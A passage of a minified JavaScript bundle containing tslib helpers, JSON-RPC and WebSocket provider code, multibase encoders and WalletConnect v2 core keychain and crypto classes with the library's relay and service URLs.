t.length=="number")return{next:function(){return t&&n>=t.length&&(t=void 0),{value:t&&t[n++],done:!t}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")}function kC(t,e){var r=typeof Symbol=="function"&&t[Symbol.iterator];if(!r)return t;var n=r.call(t),i,s=[],o;try{for(;(e===void 0||e-- >0)&&!(i=n.next()).done;)s.push(i.value)}catch(a){o={error:a}}finally{try{i&&!i.done&&(r=n.return)&&r.call(n)}finally{if(o)throw o.error}}return s}function pM(){for(var t=[],e=0;e<arguments.length;e++)t=t.concat(kC(arguments[e]));return t}function gM(){for(var t=0,e=0,r=arguments.length;e<r;e++)t+=arguments[e].length;for(var n=Array(t),i=0,e=0;e<r;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,i++)n[i]=s[o];return n}function Ju(t){return this instanceof Ju?(this.v=t,this):new Ju(t)}function mM(t,e,r){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var n=r.apply(t,e||[]),i,s=[];return i={},o("next"),o("throw"),o("return"),i[Symbol.asyncIterator]=function(){return this},i;function o(d){n[d]&&(i[d]=function(g){return new Promise(function(y,m){s.push([d,g,y,m])>1||a(d,g)})})}function a(d,g){try{c(n[d](g))}catch(y){h(s[0][3],y)}}function c(d){d.value instanceof Ju?Promise.resolve(d.value.v).then(u,l):h(s[0][2],d)}function u(d){a("next",d)}function l(d){a("throw",d)}function h(d,g){d(g),s.shift(),s.length&&a(s[0][0],s[0][1])}}function yM(t){var e,r;return e={},n("next"),n("throw",function(i){throw i}),n("return"),e[Symbol.iterator]=function(){return this},e;function n(i,s){e[i]=t[i]?function(o){return(r=!r)?{value:Ju(t[i](o)),done:i==="return"}:s?s(o):o}:s}}function wM(t){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var e=t[Symbol.asyncIterator],r;return e?e.call(t):(t=typeof zm=="function"?zm(t):t[Symbol.iterator](),r={},n("next"),n("throw"),n("return"),r[Symbol.asyncIterator]=function(){return this},r);function n(s){r[s]=t[s]&&function(o){return new Promise(function(a,c){o=t[s](o),i(a,c,o.done,o.value)})}}function i(s,o,a,c){Promise.resolve(c).then(function(u){s({value:u,done:a})},o)}}function bM(t,e){return Object.defineProperty?Object.defineProperty(t,"raw",{value:e}):t.raw=e,t}function vM(t){if(t&&t.__esModule)return t;var e={};if(t!=null)for(var r in t)Object.hasOwnProperty.call(t,r)&&(e[r]=t[r]);return e.default=t,e}function EM(t){return t&&t.__esModule?t:{default:t}}function AM(t,e){if(!e.has(t))throw new TypeError("attempted to get private field on non-instance");return e.get(t)}function _M(t,e,r){if(!e.has(t))throw new TypeError("attempted to set private field on non-instance");return e.set(t,r),r}const CM=Object.freeze(Object.defineProperty({__proto__:null,get __assign(){return qm},__asyncDelegator:yM,__asyncGenerator:mM,__asyncValues:wM,__await:Ju,__awaiter:lM,__classPrivateFieldGet:AM,__classPrivateFieldSet:_M,__createBinding:dM,__decorate:aM,__exportStar:fM,__extends:sM,__generator:hM,__importDefault:EM,__importStar:vM,__makeTemplateObject:bM,__metadata:uM,__param:cM,__read:kC,__rest:oM,__spread:pM,__spreadArrays:gM,__values:zm},Symbol.toStringTag,{value:"Module"})),IM=z0(CM);var rs={},iv;function xM(){if(iv)return rs;iv=1,Object.defineProperty(rs,"__esModule",{value:!0}),rs.isBrowserCryptoAvailable=rs.getSubtleCrypto=rs.getBrowerCrypto=void 0;function t(){return(ci==null?void 0:ci.crypto)||(ci==null?void 0:ci.msCrypto)||{}}rs.getBrowerCrypto=t;function e(){const n=t();return n.subtle||n.webkitSubtle}rs.getSubtleCrypto=e;function r(){return!!t()&&!!e()}return rs.isBrowserCryptoAvailable=r,rs}var ns={},sv;function SM(){if(sv)return ns;sv=1,Object.defineProperty(ns,"__esModule",{value:!0}),ns.isBrowser=ns.isNode=ns.isReactNative=void 0;function t(){return typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"}ns.isReactNative=t;function e(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}ns.isNode=e;function r(){return!t()&&!e()}return ns.isBrowser=r,ns}var ov;function NM(){return ov||(ov=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=IM;e.__exportStar(xM(),t),e.__exportStar(SM(),t)}(sg)),sg}var TM=NM();function Ni(t=3){const e=Date.now()*Math.pow(10,t),r=Math.floor(Math.random()*Math.pow(10,t));return e+r}function $o(t=6){return BigInt(Ni(t))}function Ks(t,e,r){return{id:r||Ni(),jsonrpc:"2.0",method:t,params:e}}function kf(t,e){return{id:t,jsonrpc:"2.0",result:e}}function Df(t,e,r){return{id:t,jsonrpc:"2.0",error:PM(e)}}function PM(t,e){return typeof t>"u"?nv(PC):(typeof t=="string"&&(t=Object.assign(Object.assign({},nv(uy)),{message:t})),nM(t.code)&&(t=iM(t.code)),t)}let RM=class{},OM=class extends RM{constructor(){super()}},kM=class extends OM{constructor(e){super()}};const DM="^https?:",MM="^wss?:";function BM(t){const e=t.match(new RegExp(/^\w+:/,"gi"));if(!(!e||!e.length))return e[0]}function DC(t,e){const r=BM(t);return typeof r>"u"?!1:new RegExp(e).test(r)}function av(t){return DC(t,DM)}function cv(t){return DC(t,MM)}function UM(t){return new RegExp("wss?://localhost(:d{2,5})?").test(t)}function MC(t){return typeof t=="object"&&"id"in t&&"jsonrpc"in t&&t.jsonrpc==="2.0"}function ly(t){return MC(t)&&"method"in t}function Mf(t){return MC(t)&&(Ti(t)||zn(t))}function Ti(t){return"result"in t}function zn(t){return"error"in t}let Qn=class extends kM{constructor(e){super(e),this.events=new Vn.EventEmitter,this.hasRegisteredEventListeners=!1,this.connection=this.setConnection(e),this.connection.connected&&this.registerEventListeners()}async connect(e=this.connection){await this.open(e)}async disconnect(){await this.close()}on(e,r){this.events.on(e,r)}once(e,r){this.events.once(e,r)}off(e,r){this.events.off(e,r)}removeListener(e,r){this.events.removeListener(e,r)}async request(e,r){return this.requestStrict(Ks(e.method,e.params||[],e.id||$o().toString()),r)}async requestStrict(e,r){return new Promise(async(n,i)=>{if(!this.connection.connected)try{await this.open()}catch(s){i(s)}this.events.on(`${e.id}`,s=>{zn(s)?i(s.error):n(s.result)});try{await this.connection.send(e,r)}catch(s){i(s)}})}setConnection(e=this.connection){return e}onPayload(e){this.events.emit("payload",e),Mf(e)?this.events.emit(`${e.id}`,e):this.events.emit("message",{type:e.method,data:e.params})}onClose(e){e&&e.code===3e3&&this.events.emit("error",new Error(`WebSocket connection closed abnormally with code: ${e.code} ${e.reason?`(${e.reason})`:""}`)),this.events.emit("disconnect")}async open(e=this.connection){this.connection===e&&this.connection.connected||(this.connection.connected&&this.close(),typeof e=="string"&&(await this.connection.open(e),e=this.connection),this.connection=this.setConnection(e),await this.connection.open(),this.registerEventListeners(),this.events.emit("connect"))}async close(){await this.connection.close()}registerEventListeners(){this.hasRegisteredEventListeners||(this.connection.on("payload",e=>this.onPayload(e)),this.connection.on("close",e=>this.onClose(e)),this.connection.on("error",e=>this.events.emit("error",e)),this.connection.on("register_error",e=>this.onClose()),this.hasRegisteredEventListeners=!0)}};const $M=()=>typeof WebSocket<"u"?WebSocket:typeof global<"u"&&typeof global.WebSocket<"u"?global.WebSocket:typeof window<"u"&&typeof window.WebSocket<"u"?window.WebSocket:typeof self<"u"&&typeof self.WebSocket<"u"?self.WebSocket:require("ws"),LM=()=>typeof WebSocket<"u"||typeof global<"u"&&typeof global.WebSocket<"u"||typeof window<"u"&&typeof window.WebSocket<"u"||typeof self<"u"&&typeof self.WebSocket<"u",uv=t=>t.split("?")[0],lv=10,FM=$M();let jM=class{constructor(e){if(this.url=e,this.events=new Vn.EventEmitter,this.registering=!1,!cv(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);this.url=e}get connected(){return typeof this.socket<"u"}get connecting(){return this.registering}on(e,r){this.events.on(e,r)}once(e,r){this.events.once(e,r)}off(e,r){this.events.off(e,r)}removeListener(e,r){this.events.removeListener(e,r)}async open(e=this.url){await this.register(e)}async close(){return new Promise((e,r)=>{if(typeof this.socket>"u"){r(new Error("Connection already closed"));return}this.socket.onclose=n=>{this.onClose(n),e()},this.socket.close()})}async send(e){typeof this.socket>"u"&&(this.socket=await this.register());try{this.socket.send(ys(e))}catch(r){this.onError(e.id,r)}}register(e=this.url){if(!cv(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);if(this.registering){const r=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=r||this.events.listenerCount("open")>=r)&&this.events.setMaxListeners(r+1),new Promise((n,i)=>{this.events.once("register_error",s=>{this.resetMaxListeners(),i(s)}),this.events.once("open",()=>{if(this.resetMaxListeners(),typeof this.socket>"u")return i(new Error("WebSocket connection is missing or invalid"));n(this.socket)})})}return this.url=e,this.registering=!0,new Promise((r,n)=>{const i=TM.isReactNative()?void 0:{rejectUnauthorized:!UM(e)},s=new FM(e,[],i);LM()?s.onerror=o=>{const a=o;n(this.emitError(a.error))}:s.on("error",o=>{n(this.emitError(o))}),s.onopen=()=>{this.onOpen(s),r(s)}})}onOpen(e){e.onmessage=r=>this.onPayload(r),e.onclose=r=>this.onClose(r),this.socket=e,this.registering=!1,this.events.emit("open")}onClose(e){this.socket=void 0,this.registering=!1,this.events.emit("close",e)}onPayload(e){if(typeof e.data>"u")return;const r=typeof e.data=="string"?Zo(e.data):e.data;this.events.emit("payload",r)}onError(e,r){const n=this.parseError(r),i=n.message||n.toString(),s=Df(e,i);this.events.emit("payload",s)}parseError(e,r=this.url){return OC(e,uv(r),"WS")}resetMaxListeners(){this.events.getMaxListeners()>lv&&this.events.setMaxListeners(lv)}emitError(e){const r=this.parseError(new Error((e==null?void 0:e.message)||`WebSocket connection failed for host: ${uv(this.url)}`));return this.events.emit("register_error",r),r}};var qM={};const BC="wc",UC=2,Hm="core",Li=`${BC}@2:${Hm}:`,zM={logger:"error"},HM={database:":memory:"},WM="crypto",hv="client_ed25519_seed",GM=se.ONE_DAY,VM="keychain",KM="0.3",QM="messages",YM="0.3",dv=se.SIX_HOURS,JM="publisher",$C="irn",ZM="error",LC="wss://relay.walletconnect.org",XM="relayer",vr={message:"relayer_message",message_ack:"relayer_message_ack",connect:"relayer_connect",disconnect:"relayer_disconnect",error:"relayer_error",connection_stalled:"relayer_connection_stalled",transport_closed:"relayer_transport_closed",publish:"relayer_publish"},e4="_subscription",Mn={payload:"payload",connect:"connect",disconnect:"disconnect",error:"error"},t4=.1,Wm="2.19.2",Wt={link_mode:"link_mode",relay:"relay"},cd={inbound:"inbound",outbound:"outbound"},r4="0.3",n4="WALLETCONNECT_CLIENT_ID",fv="WALLETCONNECT_LINK_MODE_APPS",An={created:"subscription_created",deleted:"subscription_deleted",expired:"subscription_expired",disabled:"subscription_disabled",sync:"subscription_sync",resubscribed:"subscription_resubscribed"},i4="subscription",s4="0.3",o4="pairing",a4="0.3",ou={wc_pairingDelete:{req:{ttl:se.ONE_DAY,prompt:!1,tag:1e3},res:{ttl:se.ONE_DAY,prompt:!1,tag:1001}},wc_pairingPing:{req:{ttl:se.THIRTY_SECONDS,prompt:!1,tag:1002},res:{ttl:se.THIRTY_SECONDS,prompt:!1,tag:1003}},unregistered_method:{req:{ttl:se.ONE_DAY,prompt:!1,tag:0},res:{ttl:se.ONE_DAY,prompt:!1,tag:0}}},Do={create:"pairing_create",expire:"pairing_expire",delete:"pairing_delete",ping:"pairing_ping"},ei={created:"history_created",updated:"history_updated",deleted:"history_deleted",sync:"history_sync"},c4="history",u4="0.3",l4="expirer",qn={created:"expirer_created",deleted:"expirer_deleted",expired:"expirer_expired",sync:"expirer_sync"},h4="0.3",d4="verify-api",f4="https://verify.walletconnect.com",FC="https://verify.walletconnect.org",Tu=FC,p4=`${Tu}/v3`,g4=[f4,FC],m4="echo",y4="https://echo.walletconnect.com",xi={pairing_started:"pairing_started",pairing_uri_validation_success:"pairing_uri_validation_success",pairing_uri_not_expired:"pairing_uri_not_expired",store_new_pairing:"store_new_pairing",subscribing_pairing_topic:"subscribing_pairing_topic",subscribe_pairing_topic_success:"subscribe_pairing_topic_success",existing_pairing:"existing_pairing",pairing_not_expired:"pairing_not_expired",emit_inactive_pairing:"emit_inactive_pairing",emit_session_proposal:"emit_session_proposal",subscribing_to_pairing_topic:"subscribing_to_pairing_topic"},ss={no_wss_connection:"no_wss_connection",no_internet_connection:"no_internet_connection",malformed_pairing_uri:"malformed_pairing_uri",active_pairing_already_exists:"active_pairing_already_exists",subscribe_pairing_topic_failure:"subscribe_pairing_topic_failure",pairing_expired:"pairing_expired",proposal_expired:"proposal_expired",proposal_listener_not_found:"proposal_listener_not_found"},ti={session_approve_started:"session_approve_started",proposal_not_expired:"proposal_not_expired",session_namespaces_validation_success:"session_namespaces_validation_success",create_session_topic:"create_session_topic",subscribing_session_topic:"subscribing_session_topic",subscribe_session_topic_success:"subscribe_session_topic_success",publishing_session_approve:"publishing_session_approve",session_approve_publish_success:"session_approve_publish_success",store_session:"store_session",publishing_session_settle:"publishing_session_settle",session_settle_publish_success:"session_settle_publish_success"},Io={no_internet_connection:"no_internet_connection",no_wss_connection:"no_wss_connection",proposal_expired:"proposal_expired",subscribe_session_topic_failure:"subscribe_session_topic_failure",session_approve_publish_failure:"session_approve_publish_failure",session_settle_publish_failure:"session_settle_publish_failure",session_approve_namespace_validation_failure:"session_approve_namespace_validation_failure",proposal_not_found:"proposal_not_found"},xo={authenticated_session_approve_started:"authenticated_session_approve_started",create_authenticated_session_topic:"create_authenticated_session_topic",cacaos_verified:"cacaos_verified",store_authenticated_session:"store_authenticated_session",subscribing_authenticated_session_topic:"subscribing_authenticated_session_topic",subscribe_authenticated_session_topic_success:"subscribe_authenticated_session_topic_success",publishing_authenticated_session_approve:"publishing_authenticated_session_approve"},au={no_internet_connection:"no_internet_connection",invalid_cacao:"invalid_cacao",subscribe_authenticated_session_topic_failure:"subscribe_authenticated_session_topic_failure",authenticated_session_approve_publish_failure:"authenticated_session_approve_publish_failure",authenticated_session_pending_request_not_found:"authenticated_session_pending_request_not_found"},w4=.1,b4="event-client",v4=86400,E4="https://pulse.walletconnect.org/batch";function A4(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var r=new Uint8Array(256),n=0;n<r.length;n++)r[n]=255;for(var i=0;i<t.length;i++){var s=t.charAt(i),o=s.charCodeAt(0);if(r[o]!==255)throw new TypeError(s+" is ambiguous");r[o]=i}var a=t.length,c=t.charAt(0),u=Math.log(a)/Math.log(256),l=Math.log(256)/Math.log(a);function h(y){if(y instanceof Uint8Array||(ArrayBuffer.isView(y)?y=new Uint8Array(y.buffer,y.byteOffset,y.byteLength):Array.isArray(y)&&(y=Uint8Array.from(y))),!(y instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(y.length===0)return"";for(var m=0,b=0,A=0,_=y.length;A!==_&&y[A]===0;)A++,m++;for(var T=(_-A)*l+1>>>0,P=new Uint8Array(T);A!==_;){for(var S=y[A],C=0,O=T-1;(S!==0||C<b)&&O!==-1;O--,C++)S+=256*P[O]>>>0,P[O]=S%a>>>0,S=S/a>>>0;if(S!==0)throw new Error("Non-zero carry");b=C,A++}for(var $=T-b;$!==T&&P[$]===0;)$++;for(var D=c.repeat(m);$<T;++$)D+=t.charAt(P[$]);return D}function d(y){if(typeof y!="string")throw new TypeError("Expected String");if(y.length===0)return new Uint8Array;var m=0;if(y[m]!==" "){for(var b=0,A=0;y[m]===c;)b++,m++;for(var _=(y.length-m)*u+1>>>0,T=new Uint8Array(_);y[m];){var P=r[y.charCodeAt(m)];if(P===255)return;for(var S=0,C=_-1;(P!==0||S<A)&&C!==-1;C--,S++)P+=a*T[C]>>>0,T[C]=P%256>>>0,P=P/256>>>0;if(P!==0)throw new Error("Non-zero carry");A=S,m++}if(y[m]!==" "){for(var O=_-A;O!==_&&T[O]===0;)O++;for(var $=new Uint8Array(b+(_-O)),D=b;O!==_;)$[D++]=T[O++];return $}}}function g(y){var m=d(y);if(m)return m;throw new Error(`Non-${e} character`)}return{encode:h,decodeUnsafe:d,decode:g}}var _4=A4,C4=_4;const jC=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},I4=t=>new TextEncoder().encode(t),x4=t=>new TextDecoder().decode(t);class S4{constructor(e,r,n){this.name=e,this.prefix=r,this.baseEncode=n}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class N4{constructor(e,r,n){if(this.name=e,this.prefix=r,r.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=r.codePointAt(0),this.baseDecode=n}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return qC(this,e)}}class T4{constructor(e){this.decoders=e}or(e){return qC(this,e)}decode(e){const r=e[0],n=this.decoders[r];if(n)return n.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const qC=(t,e)=>new T4({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});class P4{constructor(e,r,n,i){this.name=e,this.prefix=r,this.baseEncode=n,this.baseDecode=i,this.encoder=new S4(e,r,n),this.decoder=new N4(e,r,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const Bf=({name:t,prefix:e,encode:r,decode:n})=>new P4(t,e,r,n),ih=({prefix:t,name:e,alphabet:r})=>{const{encode:n,decode:i}=C4(r,e);return Bf({prefix:t,name:e,encode:n,decode:s=>jC(i(s))})},R4=(t,e,r,n)=>{const i={};for(let l=0;l<e.length;++l)i[e[l]]=l;let s=t.length;for(;t[s-1]==="=";)--s;const o=new Uint8Array(s*r/8|0);let a=0,c=0,u=0;for(let l=0;l<s;++l){const h=i[t[l]];if(h===void 0)throw new SyntaxError(`Non-${n} character`);c=c<<r|h,a+=r,a>=8&&(a-=8,o[u++]=255&c>>a)}if(a>=r||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},O4=(t,e,r)=>{const n=e[e.length-1]==="=",i=(1<<r)-1;let s="",o=0,a=0;for(let c=0;c<t.length;++c)for(a=a<<8|t[c],o+=8;o>r;)o-=r,s+=e[i&a>>o];if(o&&(s+=e[i&a<<r-o]),n)for(;s.length*r&7;)s+="=";return s},$r=({name:t,prefix:e,bitsPerChar:r,alphabet:n})=>Bf({prefix:e,name:t,encode(i){return O4(i,n,r)},decode(i){return R4(i,n,r,t)}}),k4=Bf({prefix:"\0",name:"identity",encode:t=>x4(t),decode:t=>I4(t)});var D4=Object.freeze({__proto__:null,identity:k4});const M4=$r({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var B4=Object.freeze({__proto__:null,base2:M4});const U4=$r({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var $4=Object.freeze({__proto__:null,base8:U4});const L4=ih({prefix:"9",name:"base10",alphabet:"0123456789"});var F4=Object.freeze({__proto__:null,base10:L4});const j4=$r({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),q4=$r({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var z4=Object.freeze({__proto__:null,base16:j4,base16upper:q4});const H4=$r({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),W4=$r({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),G4=$r({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),V4=$r({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),K4=$r({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),Q4=$r({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),Y4=$r({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),J4=$r({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),Z4=$r({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var X4=Object.freeze({__proto__:null,base32:H4,base32upper:W4,base32pad:G4,base32padupper:V4,base32hex:K4,base32hexupper:Q4,base32hexpad:Y4,base32hexpadupper:J4,base32z:Z4});const eB=ih({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),tB=ih({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var rB=Object.freeze({__proto__:null,base36:eB,base36upper:tB});const nB=ih({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),iB=ih({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var sB=Object.freeze({__proto__:null,base58btc:nB,base58flickr:iB});const oB=$r({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),aB=$r({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),cB=$r({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),uB=$r({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var lB=Object.freeze({__proto__:null,base64:oB,base64pad:aB,base64url:cB,base64urlpad:uB});const zC=Array.from(""),hB=zC.reduce((t,e,r)=>(t[r]=e,t),[]),dB=zC.reduce((t,e,r)=>(t[e.codePointAt(0)]=r,t),[]);function fB(t){return t.reduce((e,r)=>(e+=hB[r],e),"")}function pB(t){const e=[];for(const r of t){const n=dB[r.codePointAt(0)];if(n===void 0)throw new Error(`Non-base256emoji character: ${r}`);e.push(n)}return new Uint8Array(e)}const gB=Bf({prefix:"",name:"base256emoji",encode:fB,decode:pB});var mB=Object.freeze({__proto__:null,base256emoji:gB}),yB=HC,pv=128,wB=-128,bB=Math.pow(2,31);function HC(t,e,r){e=e||[],r=r||0;for(var n=r;t>=bB;)e[r++]=t&255|pv,t/=128;for(;t&wB;)e[r++]=t&255|pv,t>>>=7;return e[r]=t|0,HC.bytes=r-n+1,e}var vB=Gm,EB=128,gv=127;function Gm(t,n){var r=0,n=n||0,i=0,s=n,o,a=t.length;do{if(s>=a)throw Gm.bytes=0,new RangeError("Could not decode varint");o=t[s++],r+=i<28?(o&gv)<<i:(o&gv)*Math.pow(2,i),i+=7}while(o>=EB);return Gm.bytes=s-n,r}var AB=Math.pow(2,7),_B=Math.pow(2,14),CB=Math.pow(2,21),IB=Math.pow(2,28),xB=Math.pow(2,35),SB=Math.pow(2,42),NB=Math.pow(2,49),TB=Math.pow(2,56),PB=Math.pow(2,63),RB=function(t){return t<AB?1:t<_B?2:t<CB?3:t<IB?4:t<xB?5:t<SB?6:t<NB?7:t<TB?8:t<PB?9:10},OB={encode:yB,decode:vB,encodingLength:RB},WC=OB;const mv=(t,e,r=0)=>(WC.encode(t,e,r),e),yv=t=>WC.encodingLength(t),Vm=(t,e)=>{const r=e.byteLength,n=yv(t),i=n+yv(r),s=new Uint8Array(i+r);return mv(t,s,0),mv(r,s,n),s.set(e,i),new kB(t,r,e,s)};let kB=class{constructor(e,r,n,i){this.code=e,this.size=r,this.digest=n,this.bytes=i}};const GC=({name:t,code:e,encode:r})=>new DB(t,e,r);class DB{constructor(e,r,n){this.name=e,this.code=r,this.encode=n}digest(e){if(e instanceof Uint8Array){const r=this.encode(e);return r instanceof Uint8Array?Vm(this.code,r):r.then(n=>Vm(this.code,n))}else throw Error("Unknown type, must be binary type")}}const VC=t=>async e=>new Uint8Array(await crypto.subtle.digest(t,e)),MB=GC({name:"sha2-256",code:18,encode:VC("SHA-256")}),BB=GC({name:"sha2-512",code:19,encode:VC("SHA-512")});var UB=Object.freeze({__proto__:null,sha256:MB,sha512:BB});const KC=0,$B="identity",QC=jC,LB=t=>Vm(KC,QC(t)),FB={code:KC,name:$B,encode:QC,digest:LB};var jB=Object.freeze({__proto__:null,identity:FB});new TextEncoder,new TextDecoder;const wv={...D4,...B4,...$4,...F4,...z4,...X4,...rB,...sB,...lB,...mB};({...UB,...jB});function qB(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?globalThis.Buffer.allocUnsafe(t):new Uint8Array(t)}function YC(t,e,r,n){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:r},decoder:{decode:n}}}const bv=YC("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),og=YC("ascii","a",t=>{let e="a";for(let r=0;r<t.length;r++)e+=String.fromCharCode(t[r]);return e},t=>{t=t.substring(1);const e=qB(t.length);for(let r=0;r<t.length;r++)e[r]=t.charCodeAt(r);return e}),zB={utf8:bv,"utf-8":bv,hex:wv.base16,latin1:og,ascii:og,binary:og,...wv};function HB(t,e="utf8"){const r=zB[e];if(!r)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t,"utf8"):r.decoder.decode(`${r.prefix}${t}`)}var WB=Object.defineProperty,GB=(t,e,r)=>e in t?WB(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Ai=(t,e,r)=>GB(t,typeof e!="symbol"?e+"":e,r);class VB{constructor(e,r){this.core=e,this.logger=r,Ai(this,"keychain",new Map),Ai(this,"name",VM),Ai(this,"version",KM),Ai(this,"initialized",!1),Ai(this,"storagePrefix",Li),Ai(this,"init",async()=>{if(!this.initialized){const n=await this.getKeyChain();typeof n<"u"&&(this.keychain=n),this.initialized=!0}}),Ai(this,"has",n=>(this.isInitialized(),this.keychain.has(n))),Ai(this,"set",async(n,i)=>{this.isInitialized(),this.keychain.set(n,i),await this.persist()}),Ai(this,"get",n=>{this.isInitialized();const i=this.keychain.get(n);if(typeof i>"u"){const{message:s}=oe("NO_MATCHING_KEY",`${this.name}: ${n}`);throw new Error(s)}return i}),Ai(this,"del",async n=>{this.isInitialized(),this.keychain.delete(n),await this.persist()}),this.core=e,this.logger=Gr(r,this.name)}get context(){return gn(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}async setKeyChain(e){await this.core.storage.setItem(this.storageKey,Tm(e))}async getKeyChain(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?Pm(e):void 0}async persist(){await this.setKeyChain(this.keychain)}isInitialized(){if(!this.initialized){const{message:e}=oe("NOT_INITIALIZED",this.name);throw new Error(e)}}}var KB=Object.defineProperty,QB=(t,e,r)=>e in t?KB(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Nr=(t,e,r)=>QB(t,typeof e!="symbol"?e+"":e,r);class YB{constructor(e,r,n){this.core=e,this.logger=r,Nr(this,"name",WM),Nr(this,"keychain"),Nr(this,"randomSessionIdentifier",Fm()),Nr(this,"initialized",!1),Nr(this,"init",async()=>{this.initialized||(await this.keychain.init(),this.initialized=!0)}),Nr(this,"hasKeys",i=>(this.isInitialized(),this.keychain.has(i))),Nr(this,"getClientId",async()=>{this.isInitialized();const i=await this.getClientSeed(),s=Qw(i);return l_(s.publicKey)}),Nr(this,"generateKeyPair",()=>{this.isInitialized();const i=i8();return this.setPrivateKey(i.publicKey,i.privateKey)}),Nr(this,"signJWT",async i=>{this.isInitialized();const s=await this.getClientSeed(),o=Qw(s),a=this.randomSessionIdentifier;return await I3(a,i,GM,o)}),Nr(this,"generateSharedKey",(i,s,o)=>{this.isInitialized();const a=this.getPrivateKey(i),c=s8(a,s);return this.setSymKey(c,o)}),Nr(this,"setSymKey",async(i,s)=>{this.isInitialized();const o=s||ad(i);return await this.keychain.set(o,i),o}),Nr(this,"deleteKeyPair",async i=>{this.isInitialized(),await this.keychain.del(i)}),Nr(this,"deleteSymKey",async i=>{this.isInitialized(),await this.keychain.del(i)}),Nr(this,"encode",async(i,s,o)=>{this.isInitialized();const a=SC(o),c=ys(s);if(Kb(a))return c8(c,o==null?void 0:o.encoding);if(Vb(a)){const d=a.senderPublicKey,g=a.receiverPublicKey;i=await this.generateSharedKey(d,g)}const u=this.getSymKey(i),{type:l,senderPublicKey:h}=a;return o8({type:l,symKey:u,message:c,senderPublicKey:h,encoding:o==null?void 0:o.encoding})}),Nr(this,"decode",async(i,s,o)=>{this.isInitialized();const a=l8(s,o);if(Kb(a)){const c=u8(s,o==null?void 0:o.encoding);return Zo(c)}if(Vb(a)){const c=a.receiverPublicKey,u=a.senderPublicKey;i=await this.generateSharedKey(c,u)}try{const 